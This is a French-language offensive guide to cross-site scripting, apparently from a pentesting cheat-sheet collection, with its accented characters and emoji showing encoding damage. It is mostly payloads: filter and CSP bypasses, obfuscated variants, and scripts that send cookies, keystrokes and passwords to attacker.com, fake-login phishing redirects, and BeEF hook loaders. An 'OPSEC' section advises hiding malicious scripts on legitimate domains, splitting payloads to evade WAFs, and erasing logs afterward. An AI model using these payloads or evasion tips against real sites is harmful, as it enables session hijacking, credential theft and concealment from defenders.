# Cross-Site Scripting (XSS) - Guide Complet

## üóÇÔ∏è Workflow d'exploitation XSS
1. Identification des points d'injection (param√®tres, formulaires, headers)
   ‚Üì
2. Test des filtres et protections (caract√®res, mots-cl√©s, CSP)
   ‚Üì
3. D√©veloppement du payload adapt√© (reflected, stored, DOM)
   ‚Üì
4. Bypass des protections (encodage, obfuscation, techniques avanc√©es)
   ‚Üì
5. Exploitation (vol de cookies, redirection, keylogger, etc.)
   ‚Üì
6. Post-exploitation (persistance, pivoting, √©l√©vation)

## üìã Vue d'ensemble

Les failles XSS permettent d'injecter du code JavaScript malveillant dans une application web, qui sera ensuite ex√©cut√© dans le navigateur des victimes.

> **üí° Explication Simple** : C'est comme glisser un faux message dans le journal de l'√©cole. Quand les autres √©l√®ves lisent le journal, ils voient votre message et peuvent faire ce que vous voulez qu'ils fassent.

## üéØ Types de XSS

### Reflected XSS (Non-persistant)
```html
<!-- URL vuln√©rable -->
http://site.com/search?q=<script>alert('XSS')</script>

<!-- Tests de base -->
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### Stored XSS (Persistant)
```html
<!-- Dans un commentaire, profil, message -->
<script>
// Payload qui vole les cookies
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Payload discret -->
<img src="http://attacker.com/logger?cookie=" + document.cookie style="display:none">

<!-- Redirection malveillante -->
<script>window.location='http://attacker.com/phishing'</script>
```

### DOM-based XSS
```javascript
// Code vuln√©rable c√¥t√© client
var search = location.search.substring(1);
document.getElementById('result').innerHTML = "R√©sultats pour: " + search;

// Exploitation
http://site.com/page#<script>alert('XSS')</script>
http://site.com/page#<img src=x onerror=alert('XSS')>
```

## üîç D√©tection et Tests

### Payloads de d√©tection basiques
```html
<!-- Tests simples -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>

<!-- Tests avec √©v√©nements -->
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>

<!-- Tests sans parenth√®ses -->
<script>alert`1`</script>
<svg onload=alert`1`>
```

### Tests sp√©cialis√©s par contexte
```html
<!-- Dans un attribut HTML -->
" onmouseover="alert(1)
' onmouseover='alert(1)
"><script>alert(1)</script>

<!-- Dans du JavaScript -->
'; alert(1); //
'; alert(1); /*

<!-- Dans une URL -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- Dans du CSS -->
<style>@import'javascript:alert(1)';</style>
<style>body{background:url("javascript:alert(1)")}</style>
```

## üö´ Bypass des Protections

### Filtres de mots-cl√©s
```html
<!-- Bypass "script" -->
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>aler<!--comment-->t(1)</script>

<!-- Bypass "alert" -->
<script>eval('al'+'ert(1)')</script>
<script>window['ale'+'rt'](1)</script>
<script>setTimeout('alert(1)',1)</script>
<script>Function('alert(1)')()</script>

<!-- Bypass "on" events -->
<img src=x o‚Åøerror=alert(1)>
<img src=x on¬≠error=alert(1)>
```

### Encodage et obfuscation
```html
<!-- Encodage HTML -->
<script>alert(&#49;)</script>
<script>&#97;lert(1)</script>

<!-- Encodage URL -->
<script>alert(%31)</script>
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Encodage JavaScript -->
<script>alert(String.fromCharCode(49))</script>
<script>eval('\141\154\145\162\164\050\061\051')</script>

<!-- Encodage Base64 -->
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Bypass CSP (Content Security Policy)
```html
<!-- Si 'unsafe-inline' autoris√© -->
<script>alert(1)</script>

<!-- Avec JSONP callback -->
<script src="https://trusted-site.com/api?callback=alert"></script>

<!-- Upload d'un fichier JS sur le m√™me domaine -->
<script src="/uploads/malicious.js"></script>

<!-- AngularJS (versions vuln√©rables) -->
{{constructor.constructor('alert(1)')()}}
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

## ‚öîÔ∏è Payloads d'Exploitation

### Vol de cookies
```javascript
// Basique
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

// Avec fetch (moderne)
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: 'cookie=' + document.cookie
});
</script>

// Discret avec image
<script>
new Image().src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>
```

### Keylogger
```javascript
<script>
document.onkeypress = function(e) {
  fetch('http://attacker.com/keys', {
    method: 'POST',
    body: 'key=' + String.fromCharCode(e.which)
  });
}
</script>
```

### Redirection et phishing
```javascript
// Redirection simple
<script>window.location='http://attacker.com/phishing'</script>

// Phishing de login
<script>
if(confirm('Session expir√©e. Reconnectez-vous:')) {
  window.location='http://attacker.com/fake-login?redirect=' + location.href;
}
</script>
```

### Capture de frappes sp√©cifiques
```javascript
<script>
// Capturer les mots de passe
document.addEventListener('input', function(e) {
  if(e.target.type === 'password') {
    fetch('http://attacker.com/capture', {
      method: 'POST',
      body: 'password=' + e.target.value
    });
  }
});
</script>
```

## üîß Outils d'Exploitation

### XSSHunter
```javascript
// Payload XSSHunter
<script src="https://yourid.xss.ht"></script>

// Ou avec obfuscation
<script>eval(String.fromCharCode(/* payload encod√© */))</script>
```

### BeEF (Browser Exploitation Framework)
```javascript
// Hook BeEF
<script src="http://beef-server:3000/hook.js"></script>

// Hook discret
<script>
function loadBeef() {
  var s = document.createElement('script');
  s.src = 'http://beef-server:3000/hook.js';
  document.head.appendChild(s);
}
setTimeout(loadBeef, 1000);
</script>
```

### Tests automatis√©s
```bash
# XSS avec Burp Suite
# 1. Capturer la requ√™te
# 2. Envoyer √† Intruder
# 3. Utiliser des payloads XSS
# 4. Analyser les r√©ponses

# Avec dalfox
dalfox url http://target.com/search?q=FUZZ

# Avec XSStrike
python3 xsstrike.py -u "http://target.com/search?q="
```

## üõ°Ô∏è Conseils OPSEC
- Utiliser des payloads discrets (pas d'alert() en production)
- H√©berger les scripts malveillants sur des domaines l√©gitimes si possible
- Fragmenter les payloads pour √©viter la d√©tection WAF
- Utiliser HTTPS pour les exfiltrations pour √©viter l'interception
- Nettoyer les traces apr√®s exploitation (logs, historique)

## ‚ö†Ô∏è Erreurs fr√©quentes
- Utiliser seulement alert() pour tester (d√©tectable et limit√©)
- Oublier de tester tous les points d'injection (headers, cookies, param√®tres cach√©s)
- Ne pas adapter le payload au contexte (HTML vs JavaScript vs attribut)
- Ignorer les XSS DOM-based (plus complexes mais tr√®s r√©pandues)
- Lancer des payloads trop agressifs qui saturent les logs

## üí° Astuces
- Combiner XSS avec CSRF pour des attaques plus puissantes
- Utiliser les payloads polyglot pour tester plusieurs contextes
- Chercher les points d'injection dans les messages d'erreur
- Tester les uploads de fichiers (SVG, HTML avec XSS)
- Utiliser les extensions de navigateur pour automatiser les tests

## üîó Pour aller plus loin
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [HackTricks - XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [XSSHunter](https://xsshunter.com/)
- [BeEF](https://beefproject.com/)

## üß≠ Navigation
- [Guide SQL Injection](./SQL_Injection.md)
- [Guide LFI/RFI](./LFI_RFI.md)
- [Retour aux applications web](./README.md) 